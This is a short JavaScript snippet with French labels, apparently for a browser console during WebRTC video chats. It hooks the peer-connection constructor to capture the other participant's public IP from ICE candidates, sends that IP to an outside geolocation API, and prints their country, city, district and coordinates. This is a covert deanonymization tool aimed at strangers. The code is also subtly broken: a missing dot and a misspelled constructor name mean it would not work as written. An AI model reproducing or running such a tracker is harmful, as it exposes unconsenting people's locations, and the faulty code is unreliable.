const apiKey = "Votre clé API ici";

window.oRTCPeerConnection = 
 window.oRTCPeerConnection || windowRTCPeerConnection;

window.RTCPeerCOnnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

const getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

    await fetch(url).then((response) =>
    response.json().then((json) => {
        const output = `
        --------------------
        Pays: ${json.country_name}
        État: ${json.state_prov}
        Ville: ${json.city}
        Arrondissement: ${json.district}
        Lat / Long: ${json.latitude}, ${json.longitude})
        --------------------
        `;
    console.log(output);
    })
    );
};
